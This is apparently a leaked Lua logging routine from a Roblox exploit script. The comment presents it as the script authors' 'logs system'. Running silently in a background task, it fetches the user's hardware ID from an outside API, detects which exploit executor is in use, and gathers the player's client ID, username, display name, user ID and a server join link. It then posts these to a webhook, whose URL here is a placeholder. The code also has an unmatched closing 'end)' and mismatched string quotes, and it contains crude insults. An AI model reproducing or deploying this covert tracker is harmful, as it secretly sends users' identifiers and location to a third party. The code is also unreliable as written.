--[[

Aight so baso this was used as their logs system XD

]]--

task.spawn(function()
    if not syn then
        local getrequest = (request or http_request or syn and syn.request)({
            Url = "https://api.luauth.xyz/hwid", Method = "GET"})
                local hwid = string.match(getrequest.Body, "`(%w+)`")
            -- Luauth api HWID system
        -- Uses Executor fingerprints
        local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
        local player = game.Players.LocalPlayer
        local webhookcheck =
            is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
            secure_load and "Sentinel" or
            KRNLglobal and "Krnl/OxygenU" or
            getexecutorname() and "Scriptware" or
            fluxus and "Fluxus" or
            "Most likely jjsploit laugh at this clown"

        print(webhookcheck)
        local url = "a"
        local data = {
        ["username"] = "SCv3",
        ["content"] = "To Join The User Press This Link (https://web.roblox.com/home?placeID="..game.PlaceId.."&gameID"..game.JobId..")  \n \n To join the player using this link, install this plugin, it has other features btw. (https://chrome.google.com/webstore/detail/rogold/mafcicncghogpdpaieifglifaagndbni) or just fucking use SearchBlox smh. Imagine learning how to script BUT NOT KNOWING HOW TO FUCKING USE SEARCHBLOX",
        ["embeds"] = {
            {
                ["author"] = {
                                    ["name"] = "tech is cool",
                                    ["url"] = "https://www.roblox.com/groups/5756213/Gaming-Development-Studios#!/about",
                                    ["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
                                },
                    ["footer"] = {
                                    ["text"] = "Mia is also cool",
                                    ["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
                                },
                ["title"] = "**Shortcut v3 executed** \n *The user ID of the following player is ''"..shared.sent.."''\n",
                --["description"] = "Displayname: **"..yourmum.."** \n Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."**",
                ["description"] = string.format((game:GetService("RbxAnalyticsService"):GetClientId())..' < CID "..hwid.." < HWID \n + _ Client ID found _\nProfile: https://roblox.com/users/%d/profile\nUsername:** %s\n**DisplayName: **%s**\nUserID: **%d**\n Executor: **'..webhookcheck..'** \n GameID: **'..game.PlaceId..'** \n GameName: **'..GetName.Name..'** \n Avatar/Pfp:', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or ' N/A '), player.UserId),
                ["type"] = "rich",
                ["color"] = tonumber(0x7269da),
                ["image"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
                }
            }
        }
        }


        local newdata = game:GetService("HttpService"):JSONEncode(data)

        local headers = {
        ["content-type"] = "application/json"
        }
        request = http_request or request or HttpPost or syn.request
        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
        request(abcdef)
    end
end)
end)
